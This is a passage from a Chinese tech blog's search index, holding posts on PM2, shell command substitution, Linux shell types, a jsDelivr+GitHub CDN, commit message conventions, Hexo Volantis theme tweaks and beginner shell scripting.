model)和超出最大内存限制等情况下实现自动重启。 为了保证能够稳定运行，可以参考以下几点建议： 应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况； 最大内存限制，根据观察设定合理内存限制，保证应用异常运行； min_uptime，min_uptime 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动； 设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题； 设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。 参考链接 pm2 从入门到精通 如何在生产服务器上安装PM2运行Node.js应用程序 PM2 配置文件说明解析 PM2 应用配置文件解析 PM2 实用手册 PM2 用法详解 使用pm2 自动部署node项目 PM2 中文文档","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"进程管理","slug":"Node/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"Linux 中的eval、反引号、$()的区别","slug":"the-difference-between-eval-and-backquotes-in-linux-and","date":"2020-07-11T12:41:10.000Z","updated":"2020-07-11T12:46:46.350Z","comments":true,"path":"the-difference-between-eval-and-backquotes-in-linux-and/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/","excerpt":"之前在搭建 SSH 环境时，遇到了这样一个问题： 使用命令：eval$(ssh-agent)去创建一个代理进程，但是会提示：No Such file or directory 。 就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？ 后来，了解到原来一直使用的 eval$(ssh-agent) ，其中的$() 原来在Linux中有特殊的意义。 所以这篇笔记专门用来了解 eval 和 反引号 以及 $()之间的区别。 它们的作用都是命令替换。","text":"之前在搭建 SSH 环境时，遇到了这样一个问题： 使用命令：eval$(ssh-agent)去创建一个代理进程，但是会提示：No Such file or directory 。 就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？ 后来，了解到原来一直使用的 eval$(ssh-agent) ，其中的$() 原来在Linux中有特殊的意义。 所以这篇笔记专门用来了解 eval 和 反引号 以及 $()之间的区别。 它们的作用都是命令替换。 场景重现12345678910$ &#96;ssh-agent&#96;sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory$ eval ssh-agentSSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;echo Agent pid 1092;$ eval &#96;ssh-agent&#96;Agent pid 4288 直到我输入 eval ssh-agent 时，似乎就对了。 命令代换这三种不同的方式都是shell脚本中的命令代换。 命令代换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。 eval首先要介绍的是: eval 它的作用是：重新运算求出参数的内容。 该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。 1234567891011$ touch test.txt$ vim test.txt &#x2F;&#x2F; 写入 Hello eval$ var&#x3D;&quot;cat test.txt&quot;&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。$ echo $varcat test.txt$ eval $varHello eval 反引号与 $()实例一： 12345678910$ DATE1&#x3D;$(date)$ DATE2&#x3D;&#96;date&#96;$ DATE3&#x3D;&#96;eval date&#96;$ echo $DATE12019年01月23日 21:20:36$ echo $DATE22019年01月23日 21:20:36$ echo $DATE32019年01月23日 21:20:36 实例二： 1234$ echo &#96;echo &#39;\\\\&#39;&#96; \\$ echo $(echo &#39;\\\\&#39;)\\\\ 暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。 参考链接： https://kyle.io/2012/09/ssh-agent-messiness-solving-it/ shell脚本中命令代换：反引号、$()、eval区别 shell脚本中命令代换：反引号、$()、eval区别2","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"Linux 中的Shell 种类","slug":"shell-types-in-linux","date":"2020-07-11T12:36:46.000Z","updated":"2020-07-11T12:41:49.331Z","comments":true,"path":"shell-types-in-linux/","link":"","permalink":"https://www.0x2beace.com/shell-types-in-linux/","excerpt":"什么是Shell？","text":"什么是Shell？ Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。 据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。 Shell 的种类Linux Shell 的种类很多，目前流行的Shell 包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。 POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。 通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell： 1234567891011121314151617$ cat &#x2F;etc&#x2F;shells&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;pdksh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;posh&#x2F;usr&#x2F;bin&#x2F;sh&#x2F;usr&#x2F;bin&#x2F;bash&#x2F;usr&#x2F;bin&#x2F;ksh&#x2F;usr&#x2F;bin&#x2F;pdksh&#x2F;usr&#x2F;bin&#x2F;tcsh&#x2F;usr&#x2F;bin&#x2F;zsh&#x2F;usr&#x2F;bin&#x2F;dash&#x2F;usr&#x2F;bin&#x2F;posh 如何查看当前正在使用的Shell 类型： 12$ echo $SHELL&#x2F;bin&#x2F;bash $SHELL是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。 用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入zsh可以直接输入： 1$ &#x2F;bin&#x2F;zsh 这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。 最标准的ShellBashsh是Unix 上最古老的Shell，在sh的基础上添加了各种扩展功能的是bash，它成为Linux标准Shell。有如下的特点： 使用上下键快速查看历史命令 Tab 键自动补全 其他Shellashash是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。 cshcsh是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。 zshzch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性： 更好的自动补全、更高效 更好的文件名展开（通配符展开） 可定制性高 参考链接 什么是Shell以及常见Shell种类","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"免费 CDN：JsDelivr + Github","slug":"free-cdn-jsdelivr-github","date":"2020-07-10T05:32:43.000Z","updated":"2020-07-10T05:34:57.891Z","comments":true,"path":"free-cdn-jsdelivr-github/","link":"","permalink":"https://www.0x2beace.com/free-cdn-jsdelivr-github/","excerpt":"不知道大家通常是如何访问图床的，我之前一直使用的方式是：GitHub 图床 + raw.githubusercontent。 图片相关的资源全部放在GitHub上，然后使用GitHub 提供的素材服务器raw.githubusercontent去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。 因此需要使用 CDN 来加速来优化资源加载速度。","text":"不知道大家通常是如何访问图床的，我之前一直使用的方式是：GitHub 图床 + raw.githubusercontent。 图片相关的资源全部放在GitHub上，然后使用GitHub 提供的素材服务器raw.githubusercontent去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。 因此需要使用 CDN 来加速来优化资源加载速度。 CDN 是什么 CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——JsDelivr。 JsDelivr 是什么 A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网 根据官网的介绍我们可以知道它是一个免费、快速、可靠、自动化 的CDN。 那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。 快速上手JsDelivr 目前有三种用法： \u001fNpm Github Wordpress 因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。 1. 新建Github 仓库这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。 2. 将本地资源推送至仓库将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。 3. 发布仓库如果没有发布就直接使用，可能会导致文件加载异常。 自定义发布版本号： 然后点击Publish release。 4. 通过jsDeliver引用资源只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。 规则如下： 1https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file 参数说明： cdn.jsdelivr.net/gh/：jsDeliver 规定Github 的引用地址 username：你的GitHub 用户名 repository：CDN 仓库 @version：发布的版本号 file：资源文件在仓库中的路径 版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下： 123456789101112131415&#x2F;&#x2F; 通过指定版本号引用https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg&#x2F;&#x2F; 使用一个范围内的版本https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; 忽略版本号则默认使用最新版https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F; 同样的一张图片，可以对比一下jsDeliver和raw.githubusercontent 的访问速度。 jsDeliver：https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg raw.githubusercontent：https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"如何写好Commit log","slug":"how-to-write-a-commit-log","date":"2020-07-10T01:22:51.000Z","updated":"2020-07-10T01:23:51.811Z","comments":true,"path":"how-to-write-a-commit-log/","link":"","permalink":"https://www.0x2beace.com/how-to-write-a-commit-log/","excerpt":"其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。 这里就不过多介绍什么是Git了，本文的重点是Commit Log，如果还不清楚Git是什么，可以看一下我的Git系列的其他笔记。","text":"其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。 这里就不过多介绍什么是Git了，本文的重点是Commit Log，如果还不清楚Git是什么，可以看一下我的Git系列的其他笔记。 为什么要关注提交信息 加快Reviewing Code的过程 提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方 提高项目的整体质量 Angular 规范的 Commit message 格式这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。 其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。 12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&#x2F;&#x2F; 空一行&lt;body&gt;&#x2F;&#x2F; 空一行&lt;footer&gt; 其中，Header 是必需的，Body 和 Footer 可以省略。 HeaderHeader 部分只有一行，包括三个字段：type（必需）、scope（可选）和 subject（必需）。 type 用于说明 commit 的类别，只允许使用下面 7 个标识。 feat 新功能（feature） fix 修补 bug docs 文档（documentation） style 格式（不影响代码运行的变动） refactor 重构（即不是新增功能，也不是修改 bug 的代码变动） test 增加测试 chore 构建过程、辅助工具的变动 perf 提高性能 typo 打字错误 scope 用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。 subject 是 commit 目的的简短描述，不超过 50 个字符。 BodyBody 部分是对本次 commit 的详细描述，可以分成多行。 FooterFooter 部分只用于不兼容变动和关闭 Issue。 总结本来我自己一直使用的方式就是：git commit -am &quot;fix login bug，虽然并没有绝对的对错，但这显然不是最好的方式。 这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。 所以我觉得在团队之间commit时，可以不用完全按照Angular 规范的Commit message格式去提交，可以按照以下约定来执行。 commit时，只用保留 Header 部分就好。 pull request时，才需要 Header、Body、Footer 这三部分。 另外commit时需要注意以下几点： 创建短小而明确的commit，一句话说清楚。 一个小改动对应一次commit，不建议一大堆改动，一次commit。 如果添加的代码会使项目发生极大的变化，那么需要及时更新remade文件以向他人说明此次更改。 最佳实践123docs: add FAQ in readme filefeat: increase user login functionfix: fix user login bug 参考链接 Git 如何写好 Commit Log？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Hexo Volantis 主题优化 | 增加分析与统计","slug":"hexo-volantis-theme-optimization-add-analysis-and-statistics","date":"2020-07-09T13:14:37.000Z","updated":"2020-07-09T13:19:08.344Z","comments":true,"path":"hexo-volantis-theme-optimization-add-analysis-and-statistics/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/","excerpt":"Volantis 默认支持 不蒜子 的访问统计，可以自行添加百度统计和 Google Analytics。","text":"Volantis 默认支持 不蒜子 的访问统计，可以自行添加百度统计和 Google Analytics。 环境要求 Hexo：4.2 Node：12 Volantis：2.6 分析与统计字数和阅读时长 Volantis 默认没有安装 wordcount插件，所以需要手动安装： 1npm i --save hexo-wordcount 修改主题配置文件themes/volantis/_config.yml，将 wordcount 插件打开 12345plugins: ... # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount wordcount: true 继续修改主题配置文件themes/volantis/_config.yml，将 wordcount 放在需要显示的 meta 位置： 12345678# 布局layout: on_list: meta: [..., wordcount, ...] on_page: meta: header: [..., wordcount, ...] footer: [..., wordcount, ...] 百度统计百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。 访问百度统计首页，注册一个账号后登陆，添加你的博客网站。 点击获取代码，复制该代码。 在主题配置文件中，增加以下内容： 1cnzz: true 用于设置是否开启百度统计。 在themes/volantis/layout/_partial目录下，新建一个cnzz.ejs文件，将刚才复制的内容粘贴进去： 1234567891011&lt;% if (theme.cnzz)&#123; %&gt;&lt;script&gt; var _hmt &#x3D; _hmt || []; (function () &#123; var hm &#x3D; document.createElement(&quot;script&quot;); hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;; var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0]; s.parentNode.insertBefore(hm, s); &#125;)();&lt;&#x2F;script&gt;&lt;% &#125; %&gt; 最后将以下内容放在网站首页的尾部themes/volantis/layout/_partial/footer.ejs中： 1&lt;%- partial(&#39;cnzz&#39;) %&gt; 完成以上所有操作之后，可以在百度统计管理页面检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Hexo Volantis 主题优化 | 添加日历图","slug":"hexo-volantis-theme-optimization-add-calendar","date":"2020-07-09T13:07:08.000Z","updated":"2020-07-09T13:12:15.183Z","comments":true,"path":"hexo-volantis-theme-optimization-add-calendar/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/","excerpt":"一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。 默认效果如下： 因为我使用的Hexo 主题是Volantis、而该主题目前并没有集成该控件，所以需要手动配置。","text":"一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。 默认效果如下： 因为我使用的Hexo 主题是Volantis、而该主题目前并没有集成该控件，所以需要手动配置。 环境要求 Hexo：4.2 Node：12 Volantis：2.6 Volantis 低版本可能会不适用于本文介绍的方法，可以参考 YINUXY 的 Hexo主题美化 | 给你的博客加上GITHUB日历云和分类 配置 在主题配置文件 themes\\volantis\\_config.yml 下添加以下内容： 1postCalendar: true 用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 false 即可。 在归档页面 themes/volantis/layout/archive.ejs 添加以下代码： 12345&lt;div id&#x3D;&quot;calendar&quot;&gt; &lt;% if (theme.postCalendar) &#123; %&gt; &lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt; &lt;% &#125; %&gt;&lt;&#x2F;div&gt; 具体添加位置： 这里会根据主题配置文件中的postCalendar的值，来判断是否需要渲染。 点击下载日历样式文件 post-calendar.ejs，放置于themes/volantis/layout/_widget目录下。 将其中的第 16 行，替换成以下内容： 1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt; 至此已经完成了，使用hexo generate &amp;&amp; hexo server查看是否可以正常加载日历图。 默认的样式是高仿gittee，如果觉得不满意，可以参考官方文档自定义。 参考链接 hexo（sakura）仿gitee添加文章贡献度日历图（echarts）","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"编写第一个Shell 脚本","slug":"write-the-first-shell-script","date":"2020-07-08T13:56:46.000Z","updated":"2020-07-08T13:59:47.029Z","comments":true,"path":"write-the-first-shell-script/","link":"","permalink":"https://www.0x2beace.com/write-the-first-shell-script/","excerpt":"这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。","text":"这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。 什么是 shell 脚本 Shell 脚本就是将一堆的 Shell 命令以及指定执行 Shell ，通过放在一个文件中来执行。 创建第一个shell 脚本下面我们来创建第一个 shell 脚本： 123456$ vim showdate#! &#x2F;bin&#x2F;bash# this script displays the date and who&#39;s logged ondatewho 大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意： shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。 在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：#!开头。 第二行的井号作为注释行。 运行shell 脚本： 12345678$ lsshowdate$ .&#x2F;showdatebash: permission denied: .&#x2F;showdate$ sudo .&#x2F;showdatesudo: .&#x2F;showdate: command not found$ chmod u+x showdate$ .&#x2F;showdate 创建完 shell 脚本，想要运行，有两种方案： 将 shell 脚本所处的目录添加到 PATH 环境变量中; 在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件; 在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。 需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。 所以正解是：修改该文件的文件夹权限。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"对于Shell编程的理解","slug":"understanding-of-shell-programming","date":"2020-07-08T13:45:40.000Z","updated":"2020-07-08T13:55:36.897Z","comments":true,"path":"understanding-of-shell-programming/","link":"","permalink":"https://www.0x2beace.com/understanding-of-shell-programming/","excerpt":"在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。 计算机语言可以分为两大类： 低级语言 高级语言","text":"在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。 计算机语言可以分为两大类： 低级语言 高级语言 低级语言包括：机器语言和汇编语言。 高级语言包括：静态语言和动态语言。 这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。 动态语言动态语言又叫做脚本语言。 它和传统的静态语言的区别就在于: 12前者的运行过程为：编写-&gt;解释-&gt;执行而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行 脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。 这样一想，也就明白了为什么搭建Python的开发环境远比C#要快，因为它只要安装一个解释器就好了。 动态语言与静态语言存在的争议之一： 在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。 Shell编程最初在学习Shell脚本时，产生过这样一个问题：为什么还能用PHP写Shell脚本？ 当时就很不理解。这里就反应了两个问题： 对PHP的理解不深 对Shell脚本的理解不深 理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。 所以用 PHP 可以写 Shell 脚本，就没有什么好奇怪的了。你可能会问：这句话里面的 Shell怎么理解？ 还记得吗，Shell的概念是什么？ Shell 脚本就是将一堆的 Shell 命令以及指定执行 Shell ，通过放在一个文件中来执行。 脚本语言的分类脚本语言又可以分为以下两大类： Shell脚本 通用动态语言 常见的Shell脚本： sh bash csh ksh tcsh zsh AppleScript 常见的脚本语言 JavaScript Perl PHP Python Ruby VBScript","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"关于Linux的Shell、Shell脚本、Shell环境的理解","slug":"understanding-of-linux-shell-shell-script-shell-environment","date":"2020-07-08T13:40:01.000Z","updated":"2020-07-08T13:52:22.046Z","comments":true,"path":"understanding-of-linux-shell-shell-script-shell-environment/","link":"","permalink":"https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/","excerpt":"如标题所示，这片笔记主要目的是加深对Linux的Shell、Shell脚本、Shell环境的理解。","text":"如标题所示，这片笔记主要目的是加深对Linux的Shell、Shell脚本、Shell环境的理解。 什么是Shell？ 在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？ 现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。 那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。 Shell就是一种应用程序（注意：我这里用的是一种）。 这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。 什么是Shell脚本？Shell 脚本（Shell Script），是一种为 Shell 编写的脚本程序。 Shell 脚本编程有两种方式 交互式（Interactive）：用户每输入一条命令就立即执行。 批处理（Batch）：由用户事先编写好一个完整的Shell脚本，Shell会一次性执行脚本中诸多的命令。 什么是Shell环境Shell编程跟java、php编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。 0x01 Linux Linux 默认安装了 Shell 解释器。 在Linux中，主流的 Shell 是 Bash。 在一般情况下，人们并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 #!/bin/sh，它同样也可以改为 #!/bin/bash。 0x02 Mac OS Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。 0x03 WindowsWindows 出厂时没有内置 Shell 解释器，通常我们都是安装cygwin或者mingw 模拟器来Linux环境。 Cygwin Mingw 如Git的交互界面就是由Mingw模拟器提供的Bash。 脚本解释器12345bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）sh &#x3D;&gt; Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）Shell for Root（&#x2F;sbin&#x2F;sh） 第一个Shell脚本打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为sh(sh代表shell)。 123456#!&#x2F;bin&#x2F;bash#第一个Shell脚本#作用是列出当前目录下的所有文件的详情信息PWDS&#x3D;echo &#96;pwd&#96;cd $PWDSls -l 上面这个脚本中，有三种不同的元素： 第一行的脚本声明（#!）用来告诉系统使用哪种 Shell 解释器来执行该脚本； 第二行的注释信息（#）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。 剩下没有前缀标识的就是 所要执行的脚本具体命令了。 运行Shell脚本有两种方式： 1. 作为可执行程序12$ chmod +x example.sh # 使脚本具有执行权限$ .&#x2F;example.sh # 执行脚本 2. 作为解释器参数这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名: 1234# 执行脚本$ &#x2F;bin&#x2F;sh example.sh$ bash example.sh$ bash example.php 使用这种方式时，可以不用在脚本第一行声明解释器信息。 12345678$ cat example.php#这是一个用php写的Shell脚本，有两个作用#1.确认是否用解释器参数执行shell脚本可以不用写声明#2.确认如何用php写shell脚本string&#x3D;&quot;php shell&quot;echo $string$ bash example.phpphp shell","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"moment.js 用法总结","slug":"moment-js-usage-summary","date":"2020-07-07T10:59:32.000Z","updated":"2020-07-08T16:31:53.649Z","comments":true,"path":"moment-js-usage-summary/","link":"","permalink":"https://www.0x2beace.com/moment-js-usage-summary/","excerpt":"最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。 momentjs 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。","text":"最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。 momentjs 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。 